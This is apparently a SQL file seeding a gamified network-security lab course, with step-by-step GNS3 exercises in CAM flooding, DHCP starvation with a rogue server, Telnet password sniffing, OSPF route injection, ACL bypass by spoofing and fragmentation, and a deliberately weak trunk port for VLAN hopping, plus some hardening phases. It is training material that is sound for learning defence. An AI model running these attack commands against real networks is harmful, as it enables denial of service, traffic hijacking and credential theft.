<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Map Reader — you understand how a switch builds its forwarding table</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=3 AND phase='build';
UPDATE lab_phases SET title='Flood the CAM', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Force hub mode</h3><p><code>macof</code> ships with Kali''s dsniff suite. It generates random source MAC addresses as fast as your NIC can transmit — 10,000 unique MACs per second on a good day. The switch''s CAM table fills to capacity, and once it''s full, newer entries are silently dropped. Every frame for an unknown destination is then <strong>flooded to every port</strong>. You''ve turned a switch into a hub. Sniff away.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ macof · CAM overflow · hub mode</span></div>

<div class="callout danger"><p><strong>Sandbox only.</strong> This attack is noisy, detectable, and illegal outside your own lab. Keep it in GNS3.</p></div>

## Objectives

<ul class="objectives">
<li>Launch macof from Kali against SW1</li>
<li>Sniff traffic between PC1 and PC2 from Kali''s port</li>
<li>Confirm you see inter-host traffic that shouldn''t reach you</li>
</ul>

## Step 1 — Confirm you can''t see PC1→PC2 traffic yet

On Kali, start a quick tcpdump:
```
sudo tcpdump -i eth0 -nn not arp
```

While that runs, ping PC2 from PC1:
```
! on PC1
ping 10.0.0.20
```

Check Kali''s terminal. You saw nothing (or only broadcast/ARP). Right now, the switch delivers frames directly — you''re not the destination, so you don''t see them. Note this as "Before."

## Step 2 — Launch the flood

```
sudo macof -i eth0
```

By default, macof blasts 100 MACs per second on the wire. Each frame has a random source MAC and a random destination. The switch''s CAM table fills in seconds.

Check the damage:
```
! on SW1
show mac address-table count
```
The count is maxed out, and `show mac address-table` might show nothing of value — just the flood of garbage.

<div class="callout tip"><p>Run <code>sudo macof -i eth0 -s 1000</code> to go faster (1000 MACs/sec). You''ll fill most switches in under 10 seconds.</p></div>

## Step 3 — Sniff the aftermath

Leave macof running in one terminal. In a second Kali terminal:
```
sudo tcpdump -i eth0 -nn
```

Now ping PC2 from PC1 again:
```
ping 10.0.0.20       ! from PC1
```

Check Kali''s tcpdump output. You should see ICMP echo requests and replies between 10.0.0.10 and 10.0.0.20 — traffic between two hosts that has <strong>nothing to do with Kali</strong>. The switch has no room in its CAM table, so it broadcasts everything. Kali just became a silent observer on every conversation.

<div class="callout warn"><p><strong>The flood is loud.</strong> Security monitoring tools will flag 10,000+ new MACs in 10 seconds. This attack is detectable — which makes it great for learning, but poor for stealth. Modern switches have protections.</p></div>

<div class="achievement"><span class="medal">👻</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Ghost on the Wire — you''re seeing traffic the switch promised nobody else would see</span></span></div>

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +200 XP</span><h3>Targeted flood</h3><p>Instead of flooding random MACs, craft a flood that targets a <strong>specific VLAN</strong> or a <strong>specific CAM bucket</strong>. Use Scapy to generate MACs with a controlled suffix that lands in one CAM bucket (the switch hashes MAC → bucket). Watch only that bucket overflow while the rest of the table stays clean. Requires understanding your switch''s CAM hash — check the datasheet.</p></div>
', is_pro_only=FALSE
WHERE lab_id=3 AND phase='attack';
UPDATE lab_phases SET title='Starve and Replace', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Steal every address, then give out your own</h3><p>Yersinia sends DHCP Discover messages from thousands of fake MACs. The real DHCP server leases an address to each one, exhausting the pool. Legitimate clients now get nothing. While they starve, you stand up a rogue DHCP server handing out addresses with <em>your</em> gateway — and every client that boots after you becomes yours to MitM.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ DHCP starvation · rogue DHCP · MitM</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> Starving a production DHCP pool denies service to every device on that subnet. Running this outside your GNS3 lab is a denial-of-service attack.</p></div>

## Objectives

<ul class="objectives">
<li>Starve the real DHCP pool with yersinia DHCP flooding</li>
<li>Exhaust the pool and confirm legitimate requests fail</li>
<li>Deploy a rogue DHCP server that hands out YOUR gateway</li>
</ul>

## Step 1 — Observe the target

On R1, check the pool:
```
show ip dhcp pool
show ip dhcp binding
```

Note the pool size and current bindings. Save this for comparison.

## Step 2 — Starve the pool

Yersinia''s DHCP attack floods DISCOVER messages:

```
sudo yersinia dhcp -attack 1 -interface eth0
```

Wait ~30 seconds. The attack sends DISCOVERs with unique MACs, each one gets a lease. On R1:
```
show ip dhcp pool
```

Utilization approaches 100%. Try leasing on PC1 now:
```
! on PC1
ip dhcp
show ip
```

PC1 either gets nothing (request timeout) or an IP after a long delay — if any addresses remain, they''re dwindling fast.

<div class="callout tip"><p>Watch the pool drain live: <code>watch -n 2 ''show ip dhcp pool''</code> on R1 — you''ll see the count climb in real time.</p></div>

## Step 3 — Deploy the rogue DHCP server

Kali ships with `dhcpd` (ISC DHCP). Stop yersinia, then set up a rogue server:

```
sudo nano /etc/dhcp/dhcpd.conf
```

Add:
```
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.50 192.168.1.150;
  option routers 192.168.1.100;     # ← YOUR Kali IP
  option domain-name-servers 8.8.8.8;
}
```

Give Kali a static IP in the subnet:
```
sudo ip addr add 192.168.1.100/24 dev eth0
```

Start the rogue server:
```
sudo dhcpd -f -d eth0 &
```

Now any new client that requests an IP will get one from Kali''s range — with Kali as the default gateway. When they reach the internet, traffic flows through you.

## Step 4 — The payoff

Boot a fresh VPCS (PC2) or renew PC1''s lease:
```
! on PC1
ip dhcp release
ip dhcp
show ip
```

The gateway is 192.168.1.100 — your Kali box. From Kali:
```
sudo tcpdump -i eth0 -nn
```

Then ping 8.8.8.8 from PC1. You''ll see ICMP echo requests heading to Kali for forwarding. You''re the MitM.

<div class="callout warn"><p>Keep the rogue server brief — a real rogue DHCP server is a serious incident. Clean up with <code>pkill dhcpd</code> and restore the real pool by clearing bindings on R1: <code>clear ip dhcp binding *</code>.</p></div>

<div class="achievement"><span class="medal">💉</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Pool Poisoner — you emptied the well and filled it with your own water</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=8 AND phase='attack';
UPDATE lab_phases SET title='Open Both Doors', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Enable two remote-access protocols — one safe, one not</h3><p>Telnet sends everything in cleartext — passwords, configs, everything. SSH encrypts the whole session. In this phase you configure both on a router so you can compare them head-to-head. The difference is invisible to the admin typing commands, but painfully obvious to anyone watching the wire.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Telnet · SSH · VTY lines</span></div>

## The topology

| Device | Role | Image |
|---|---|---|
| R1 | Target router with both services | Cisco IOSv |
| KALI | Attacker with Wireshark | Kali Linux |

Cable: R1 Gi0/0 → SW1 Gi0/1, KALI → SW1 Gi0/2. Both in VLAN 1.

## Objectives

<ul class="objectives">
<li>Enable Telnet and SSH on R1</li>
<li>Create local users for each protocol</li>
<li>Log in from Kali using both protocols</li>
</ul>

## Step 1 — Configure the router

On R1:
```
configure terminal
hostname R1
!
ip domain-name lab.local
!
username admin password cisco123
username sshuser password cisco123
!
crypto key generate rsa modulus 2048
!
line vty 0 4
 transport input telnet ssh
 login local
!
ip ssh version 2
end
```

## Step 2 — Verify

```
show ip ssh
show line vty 0 4
```

Both Telnet (port 23) and SSH (port 22) are now listening. From Kali, confirm both work:
```
telnet 192.168.1.1
ssh sshuser@192.168.1.1
```

Both should authenticate. Log out of each.

<div class="callout info"><p><strong>The trap:</strong> Both work the same from the admin''s perspective. The difference is what an eavesdropper sees. That''s what Phase 2 is for.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Doorkeeper — both doors are open, one has a one-way mirror</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=11 AND phase='build';
UPDATE lab_phases SET title='Watch the Credentials Fly', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>See the difference on the wire</h3><p>Wireshark between Kali and R1 shows exactly what each protocol reveals. Telnet dumps the username and password in plain ASCII — you can read them in the packet bytes. SSH shows only an encrypted tunnel; the credentials and every command after them are opaque. This phase is the clearest possible argument for disabling Telnet forever.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Wireshark · cleartext credentials · encryption</span></div>

<div class="callout danger"><p><strong>Your own lab only.</strong> Sniffing someone else''s Telnet session captures their password in plain text — that''s credential theft. Keep Wireshark on your own GNS3 network.</p></div>

## Objectives

<ul class="objectives">
<li>Capture a Telnet login in Wireshark and read the password from the packet bytes</li>
<li>Capture an SSH login and confirm the credentials are encrypted</li>
<li>Compare the two packet captures side by side</li>
</ul>

## Step 1 — Capture Telnet first

On Kali, start Wireshark on eth0:
```
sudo wireshark -i eth0 -k
```

(In the terminal, use tcpdump for a simpler view):
```
sudo tcpdump -i eth0 -nn -X port 23
```

In a second terminal, Telnet into R1:
```
telnet 192.168.1.1
```

Log in with username `admin` and password `cisco123`, run a few commands (`show ip int brief`, `exit`).

## Step 2 — Read the Telnet password

Look at the tcpdump output. You''ll see lines like:
```
0x0040:  6164 6d69 6e                                   admin
```

Find the packet carrying "cisco123". It''s right there in ASCII. The entire session — every command, every response — is visible in the hex dump.

<div class="callout tip"><p>In Wireshark, use the filter <code>telnet</code> and then <strong>Follow → TCP Stream</strong>. You''ll see the entire login sequence as plain text — username, password, and every command typed.</p></div>

## Step 3 — Capture SSH

Clear the tcpdump and restart it:
```
sudo tcpdump -i eth0 -nn -X port 22
```

SSH into R1:
```
ssh sshuser@192.168.1.1
```

Log in with password `cisco123`. Look at the tcpdump output. You should see:
- SSH protocol version exchange (visible version strings)
- Key exchange packets (large, binary)
- Encrypted data (looks like random bytes)

The word "cisco123" appears **nowhere** in the capture. Neither do the commands you ran.

<div class="callout info"><p><strong>The takeaway:</strong> Telnet sends <code>admin:cisco123</code> in plain sight. SSH sends <code>1a3f8c2b...e7d0</code> — unreadable. An attacker on the same network segment gets your credentials from Telnet instantly, while SSH gives them nothing.</p></div>

## Step 4 — The Wireshark moment

If you have Wireshark GUI, do this:
- Open the Telnet capture
- **Statistics → Protocol Hierarchy** — Telnet appears as captured data
- **Follow → TCP Stream** on a Telnet packet — the entire login is plain text

Then repeat for SSH:
- Only SSHv2 packets show
- **Follow → TCP Stream** shows only encrypted binary

<div class="callout tip"><p><strong>For GNS3 without GUI:</strong> <code>sudo tcpdump -i eth0 -nn -X -w telnet.pcap port 23</code> then copy the pcap to your host and open it in Wireshark there.</p></div>

<div class="achievement"><span class="medal">🔍</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Packet Peeker — you watched someone''s password fly past on the wire</span></span></div>

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +200 XP</span><h3>Telnet MITM</h3><p>Instead of just sniffing, use ARP spoofing (<code>arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</code>) to redirect R1''s traffic through Kali. Now you''re not just observing — you''re injecting. Modify a command mid-stream using <code>ettercap</code> with a filter that replaces the output of <code>show running-config</code> with your own fabricated config. That''s a Telnet session hijack.</p></div>
', is_pro_only=TRUE
WHERE lab_id=11 AND phase='attack';
UPDATE lab_phases SET title='Inject a Fake Route', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Become a trusted OSPF neighbor and poison the routing table</h3><p>Kali runs Quagga/FRR — a full OSPF daemon. Once it establishes an adjacency with R1 or R2, it can announce any route it wants. If Kali advertises a specific route (e.g. 1.1.1.1/32 with a better metric), traffic intended for R1''s loopback gets redirected through Kali. The network trusts the voice that shouts loudest.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~40 min</span><span class="chip loot">⬡ OSPF route injection · FRR · LSA poisoning</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> Injecting OSPF routes in a production network causes routing loops, blackholes, or traffic hijack. This is a foundation exercise for Route Man-in-the-Middle — keep it in GNS3.</p></div>

## Objectives

<ul class="objectives">
<li>Install and configure FRR/Quagga on Kali as an OSPF router</li>
<li>Establish OSPF adjacency with R1</li>
<li>Advertise a more specific route and watch traffic redirect through Kali</li>
</ul>

## Step 1 — Install FRR on Kali

```
sudo apt update && sudo apt install -y frr frr-pythontools
sudo sed -i ''s/ospfd=no/ospfd=yes/'' /etc/frr/daemons
sudo systemctl restart frr
```

## Step 2 — Configure FRR for OSPF

Edit `/etc/frr/frr.conf`:
```
router ospf
 router-id 4.4.4.4
 network 10.0.0.0/30 area 0
!
interface eth0
 ip ospf cost 10
 ip ospf priority 0
```

Give Kali an IP on the same segment as R1:
```
sudo ip addr add 10.0.0.3/30 dev eth0
sudo systemctl restart frr
```

Check the adjacency on R1:
```
show ip ospf neighbor
```

You should see 4.4.4.4 (Kali) as a FULL neighbor.

## Step 3 — Inject a fake route into FRR

```
sudo vtysh
configure terminal
router ospf
 network 1.1.1.1/32 area 0
end
write memory
```

FRR now announces 1.1.1.1/32 — R1''s own loopback — but with a lower cost than R1''s real announcement. Check R2''s routing table:
```
show ip route 1.1.1.1
```

If R2 is now pointing to R1 (10.0.0.1) or directly to Kali (10.0.0.3), the injection worked. Traffic to 1.1.1.1 now passes through R1 — or Kali if it became the next hop.

<div class="callout tip"><p>For a more aggressive injection, use <code>default-information originate always</code> in FRR to inject a default route that pulls all unknown traffic through Kali.</p></div>

## Step 4 — Sniff the hijacked traffic

On Kali, capture traffic:
```
sudo tcpdump -i eth0 -nn
```

From PC1, ping 1.1.1.1 again. Kali sees the ICMP packets if the route redistributes through it. If not, run the boss fight below.

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +200 XP</span><h3>LSA Type 5 injection</h3><p>Craft a Type 5 LSA (External LSA) from Kali advertising a default route (0.0.0.0/0) with an artificially low metric. All internet-bound traffic from the OSPF domain now egresses through Kali. Use Scapy to craft the LSA packet manually — <code>sendp(IP(src="10.0.0.3", dst="224.0.0.5")/OSPF_Hdr()/OSPF_LSUpdate(lstype=5...))</code>. This is the real-world technique used in route hijacking attacks.</p></div>

<div class="achievement"><span class="medal">🧬</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Route Thief — you injected a route the network believed was legitimate</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=4 AND phase='attack';
UPDATE lab_phases SET title='Bypass the ACL', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Walk around the fence</h3><p>Standard ACLs inspect source IP only. They can''t look inside the packet at the destination port or connection state. Three bypass techniques: (1) IP spoofing — forge PC1''s IP, (2) routing around — if a second path exists, the ACL never sees the traffic, (3) fragmentation — fragment the TCP header so the ACL sees Layer 3 only and passes the fragment. This phase explores all three.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~35 min</span><span class="chip loot">⬡ IP spoofing · routing bypass · fragment绕过 · Scapy</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> ACL bypass techniques are used in network intrusions and data exfiltration. Practice only on your own GNS3 topology.</p></div>

## Objectives

<ul class="objectives">
<li>Bypass the ACL by spoofing PC1''s source IP from Kali</li>
<li>Establish a second path that avoids the ACL''d interface</li>
<li>Use fragmented TCP packets to slip past the ACL</li>
</ul>

## Method 1 — IP Spoofing

From Kali, send packets with PC1''s source IP:
```
sudo hping3 -S -a 10.0.0.100 -s 12345 -p 80 192.168.2.100
```

The `-a 10.0.0.100` spoofs the source. The ACL checks source IP against 10.0.0.100 — it matches the permit rule. The packet passes.

Check on PC2 (tcpdump):
```
sudo tcpdump -i eth0 -nn
```

The packet arrives from 10.0.0.100 — but Kali sent it. The ACL was fooled by the source IP.

<div class="callout info"><p><strong>Catch:</strong> TCP requires a three-way handshake. Spoofed SYN gets a SYN-ACK back to 10.0.0.100 (PC1), not Kali. For connectionless protocols (UDP, ICMP), spoofing works end-to-end. For TCP, use Method 3 or combine with ARP spoof.</p></div>

## Method 2 — Route around the ACL

If there''s a second router that reaches 192.168.2.0/24 without passing through R1''s Gi0/1... This works when the ACL is applied on one path but a backup path exists. In this lab there''s only one router, so this technique is for illustration — in real networks, multi-homed servers often have backup links that bypass ACL enforcement.

## Method 3 — Fragment绕过 (IP Fragmentation)

Classic ACL evasion: split the TCP packet into fragments. The first fragment has no Layer 4 header (just IP + offset 0), so the ACL can''t match Layer 4 criteria. Later fragments carry the TCP header but the ACL only checks the first.

From Kali:
```
sudo hping3 -S -p 80 --frag -c 1 192.168.2.100
```

The `--frag` flag fragments the packet. Most ACLs configured with `fragments` keyword handle this, but a standard ACL that only checks source IP won''t stop fragmented packets.

Check on PC2:
```
sudo tcpdump -i eth0 -nn -X
```

The fragments arrive at PC2. The ACL didn''t block them because each fragment in isolation looks like a valid packet with correct source IP (if spoofed) or passes through without L4 inspection.

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +250 XP</span><h3>Reflexive ACL bypass with SYN flood</h3><p>If the router uses reflexive ACL (that tracks connection state), flood it with half-open connections to exhaust the state table. While the router is busy aging out entries, sneak a forged packet through the gap. Use Scapy to send 10,000 SYN packets from random source IPs just before the real attack packet.</p></div>

<div class="achievement"><span class="medal">🧠</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">ACL Ninja — three ways past the fence and the guard never knew</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=6 AND phase='attack';
UPDATE lab_phases SET title='Harden the Access List', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>ACL that fights back</h3><p>The hardened defense: extended ACLs that check source AND destination AND protocol AND port, plus uRPF (unicast Reverse Path Forwarding) to drop spoofed packets, plus the <code>fragments</code> keyword to handle fragmentation attacks. No single defense catches everything — but layered together they stop all three bypass methods.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Extended ACL · uRPF · fragments keyword · object-group</span></div>

## Objectives

<ul class="objectives">
<li>Replace the standard ACL with an extended ACL permitting only HTTP from PC1</li>
<li>Enable uRPF on the ingress interface to drop spoofed packets</li>
<li>Add <code>fragments</code> keyword to block fragment绕过</li>
</ul>

## Step 1 — Extended ACL

On R1:
```
configure terminal
no ip access-list standard BLOCK_KALI
ip access-list extended PROTECT_SERVER
 permit tcp host 10.0.0.100 host 192.168.2.100 eq 80
 permit icmp host 10.0.0.100 host 192.168.2.100 echo
 deny ip any any
interface gi0/1
 ip access-group PROTECT_SERVER out
end
```

This ACL checks: source IP = PC1, protocol = TCP, destination = PC2, destination port = 80 (HTTP). Nothing else passes. ICMP echo is also permitted (for ping testing).

## Step 2 — Verify spoof blocks

From Kali:
```
sudo hping3 -S -a 10.0.0.100 -p 80 192.168.2.100
```

The extended ACL checks — source IP is 10.0.0.100 ✅, protocol is TCP ✅, but... the destination port in the spoofed packet is still 80, and destination IP is PC2. This might still pass! Extended ACLs check 5-tuple (src IP, dst IP, protocol, src port, dst port) — the spoofed source IP is still valid.

**The real fix for IP spoofing is uRPF:**

## Step 3 — uRPF (Reverse Path Forwarding)

On R1:
```
configure terminal
interface gi0/0
 ip verify unicast source reachable-via rx
end
```

uRPF checks: is the route back to this source IP reachable via the interface the packet arrived on? Kali''s real IP (10.0.0.200) routes back through Gi0/0 ✅. Spoofed 10.0.0.100? Its route back also goes through Gi0/0 — in this topology both 10.0.0.100 and 10.0.0.200 are on the same subnet, so uRPF on the same subnet won''t catch it.

For cross-subnet spoofing, uRPF is effective. In this topology, add a second router on a different path — then a spoofed packet arriving from the wrong interface gets dropped.

## Step 4 — Fragment block

On R1, recreate the ACL with the fragments keyword:
```
configure terminal
ip access-list extended PROTECT_SERVER_V2
 permit tcp host 10.0.0.100 host 192.168.2.100 eq 80 fragments
 permit icmp host 10.0.0.100 host 192.168.2.100 echo
 deny ip any any fragments
 permit tcp host 10.0.0.100 host 192.168.2.100 eq 80
 permit icmp host 10.0.0.100 host 192.168.2.100 echo
 deny ip any any
interface gi0/1
 ip access-group PROTECT_SERVER_V2 out
end
```

First two lines: permit fragments from PC1 (legitimate fragmentation). Third line: deny ALL fragmented packets from unknown sources. Remaining lines: normal traffic rules.

## Step 5 — Verify

From Kali, re-run all three bypass methods:
```
hping3 -S -p 80 --frag -c 1 192.168.2.100   ! fragment — blocked by fragments deny
hping3 -S -a 10.0.0.100 -p 80 192.168.2.100   ! spoof — uRPF drops
```

Check ACL counters:
```
show access-lists PROTECT_SERVER_V2
```

All three bypass attempts are denied.

<div class="callout tip"><p><strong>Production tip:</strong> Use object-group ACLs (<code>object-group ip address</code> + <code>object-group service</code>) to manage large rule sets. Combine with <code>ip access-list resequence</code> when you need to insert rules.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">ACL Architect — spoof, fragment, and route-around attacks all blocked</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=6 AND phase='harden';
UPDATE lab_phases SET title='Build the NAT Gateway', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Hide a network behind one IP</h3><p>NAT (Network Address Translation) lets dozens of private IPs share a single public address. PAT (Port Address Translation) is the specific flavor that tracks each session by source port. R1 becomes the NAT gateway for the internal network, translating 192.168.1.x to 10.0.0.x as traffic exits to the "internet" (represented by R2 and PC2).</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ NAT · PAT · overload · inside/outside</span></div>

## The topology

| Device | Role | IP |
|---|---|---|
| R1 | NAT gateway | Gi0/0 (inside): 192.168.1.1/24 · Gi0/1 (outside): 10.0.0.1/30 |
| R2 | "ISP" router | Gi0/0: 10.0.0.2/30 · Gi0/1: 203.0.113.1/24 |
| PC1 | Internal client | 192.168.1.100/24 → gw 192.168.1.1 |
| PC2 | External server | 203.0.113.100/24 → gw 203.0.113.1 |
| KALI | On same segment as R1 outside (10.0.0.0/30) |

## Objectives

<ul class="objectives">
<li>Configure NAT overload (PAT) on R1</li>
<li>Verify PC1 reaches PC2 through the NAT gateway</li>
<li>Confirm the source IP on the outside is R1''s outside interface, not PC1''s</li>
</ul>

## Step 1 — Interface config

On R1:
```
configure terminal
interface gi0/0
 ip address 192.168.1.1 255.255.255.0
 ip nat inside
 no shutdown
interface gi0/1
 ip address 10.0.0.1 255.255.255.252
 ip nat outside
 no shutdown
ip route 0.0.0.0 0.0.0.0 10.0.0.2
end
```

On R2 (ISP):
```
configure terminal
interface gi0/0
 ip address 10.0.0.2 255.255.255.252
 no shutdown
interface gi0/1
 ip address 203.0.113.1 255.255.255.0
 no shutdown
ip route 192.168.1.0 255.255.255.0 10.0.0.1
end
```

On PC1:
```
ip 192.168.1.100 255.255.255.0 192.168.1.1
```

On PC2:
```
ip 203.0.113.100 255.255.255.0 203.0.113.1
```

## Step 2 — Configure PAT

On R1:
```
configure terminal
ip access-list standard NAT_POOL
 permit 192.168.1.0 0.0.0.255
ip nat inside source list NAT_POOL interface gi0/1 overload
end
```

This translates every internal IP to R1''s outside interface (10.0.0.1) using PAT.

## Step 3 — Verify

From PC1:
```
ping 203.0.113.100
```

Should succeed. On R1, check the translations:
```
show ip nat translations
show ip nat statistics
```

You''ll see PC1''s inside local (192.168.1.100:xxxxx) mapped to inside global (10.0.0.1:yyyyy).

On R2 (or PC2), observe the source:
```
show ip route
```

From R2''s perspective, traffic comes from 10.0.0.1 — it has no idea 192.168.1.100 exists.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">NAT Smith — you hid an entire network behind a single address</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=9 AND phase='build';
UPDATE lab_phases SET title='Build the Battlefield', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Build the Battlefield</h3>
<p>Before you can break a network, you need one worth breaking. You''re standing up a small corporate LAN: two switches, three VLANs, and one very juicy server holding the <code>crown jewels</code>. Users live in VLAN 10. Servers live in VLAN 20. They are <strong>never</strong> supposed to talk directly.</p>
<p>By the end of this lab, your Kali box — plugged into a lowly user port — will be reading the server VLAN''s traffic. But first: build it exactly as a slightly-careless junior admin would. That carelessness is the whole point.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 500 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~20 min</span>
<span class="chip loot">⚿ Loot: VLANs · 802.1Q trunking · router-on-a-stick</span>
</div>

## Your arsenal (GNS3)

Drag these into a fresh GNS3 project:

| Device | Role | Suggested image |
|---|---|---|
| SW1, SW2 | The switches you''ll fight over | Cisco IOSvL2 / vIOS-L2 |
| R1 | Router-on-a-stick (inter-VLAN routing) | Cisco IOSv / vIOS |
| PC1 | Innocent user, VLAN 10 | VPCS |
| SRV1 | The crown jewels, VLAN 20 | VPCS (or Ubuntu docker) |
| KALI | You. The problem. | Kali Linux |

Wire it like the topology above: `PC1→SW1 Fa0/1`, `KALI→SW1 Fa0/3`, `SW1↔SW2` on `Fa0/2`, `R1→SW1` on `Fa0/24`, `SRV1→SW2 Fa0/1`.

<ul class="objectives">
<li>Create VLANs 10, 20, 99 on both switches</li>
<li>Put PC1 in VLAN 10 and SRV1 in VLAN 20 (access ports)</li>
<li>Trunk SW1↔SW2 and R1↔SW1</li>
<li>Give R1 a sub-interface gateway per VLAN</li>
<li>Leave KALI''s port on its lazy default (this is the trap)</li>
<li>Prove PC1 and SRV1 work — then that they CAN''T reach each other</li>
</ul>

## Step 1 — Carve up the VLANs (SW1 **and** SW2)

Run this on **both** switches:

```
enable
configure terminal
vlan 10
 name USERS
vlan 20
 name SERVERS
vlan 99
 name PARKING
end
```

## Step 2 — Access ports for the honest citizens

On **SW1**, hand PC1 its VLAN:

```
configure terminal
interface FastEthernet0/1
 description PC1-USER
 switchport mode access
 switchport access vlan 10
end
```

On **SW2**, do the same for the server:

```
configure terminal
interface FastEthernet0/1
 description SRV1-CROWN-JEWELS
 switchport mode access
 switchport access vlan 20
end
```

## Step 3 — Build the trunks

Trunks carry every VLAN between devices. SW1↔SW2 and R1↔SW1:

```
! On SW1
interface FastEthernet0/2
 description TRUNK-TO-SW2
 switchport trunk encapsulation dot1q
 switchport mode trunk
!
interface FastEthernet0/24
 description TRUNK-TO-R1
 switchport trunk encapsulation dot1q
 switchport mode trunk
end
```

```
! On SW2
interface FastEthernet0/2
 description TRUNK-TO-SW1
 switchport trunk encapsulation dot1q
 switchport mode trunk
end
```

<div class="callout info">
<p>If your switch image rejects <code>switchport trunk encapsulation dot1q</code>, it only speaks 802.1Q anyway — just skip that line and run <code>switchport mode trunk</code> on its own.</p>
</div>

## Step 4 — Router-on-a-stick (so VLANs can reach the outside)

One physical link, one sub-interface per VLAN. On **R1**:

```
configure terminal
interface GigabitEthernet0/0
 no shutdown
!
interface GigabitEthernet0/0.10
 encapsulation dot1Q 10
 ip address 10.0.10.1 255.255.255.0
!
interface GigabitEthernet0/0.20
 encapsulation dot1Q 20
 ip address 10.0.20.1 255.255.255.0
end
write memory
```

## Step 5 — Address the hosts

On **PC1** (VPCS):
```
ip 10.0.10.10 255.255.255.0 10.0.10.1
```
On **SRV1** (VPCS):
```
ip 10.0.20.10 255.255.255.0 10.0.20.1
```

## Step 6 — Plant the trap 🪤

Here''s the "careless junior admin" move. KALI''s port keeps Cisco''s **default** setting — which quietly offers to become a trunk to anyone who asks:

```
! On SW1 — the deliberately weak port
configure terminal
interface FastEthernet0/3
 description KALI-USER-PORT
 switchport mode dynamic auto
end
```

<div class="callout warn">
<p><strong>This is the vulnerability.</strong> <code>dynamic auto</code> means "I won''t start a trunk, but I''ll happily <em>accept</em> one if the other side asks." On a user port, that''s a loaded gun. You''ll pull the trigger in Phase 2.</p>
</div>

## Step 7 — Sanity check

```
ping 10.0.10.1        ! from PC1 → its gateway: should work
```
From PC1, try to reach the server directly:
```
ping 10.0.20.10       ! should FAIL or route via R1 only — VLANs are isolated
```

If PC1 reaches its gateway and the two VLANs are properly separated, the battlefield is ready.

<div class="achievement">
<span class="medal">🏗️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Network Architect — you built the thing you''re about to wreck</span></span>
</div>

**Next:** Phase 2. You''re a switch now. Congratulations.
', is_pro_only=FALSE
WHERE lab_id=1 AND phase='build';
UPDATE lab_phases SET title='Become the Switch', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Become the Switch</h3>
<p>Your Kali box is plugged into a <strong>user</strong> port. It should only ever see VLAN 10. But you built SW1 with a friendly, trusting <code>dynamic auto</code> port — and switches negotiate trunks with a little protocol called <strong>DTP</strong>. So you''re going to ask, politely, in DTP: <em>"hey, wanna form a trunk?"</em> The switch says yes. And a trunk carries <strong>every</strong> VLAN.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> every command here runs against <strong>your own GNS3 lab</strong>. Running this on a network you don''t own is a crime, not a lab. Keep it in the sandbox.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 700 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: DTP switch-spoofing · 802.1Q sub-interfaces · VLAN hopping</span>
</div>

## Step 1 — Confirm you''re boxed in

On Kali, look at your link. Right now you''re a plain access port in VLAN 10 — you can''t see VLAN 20:

```
ip -br link show eth0
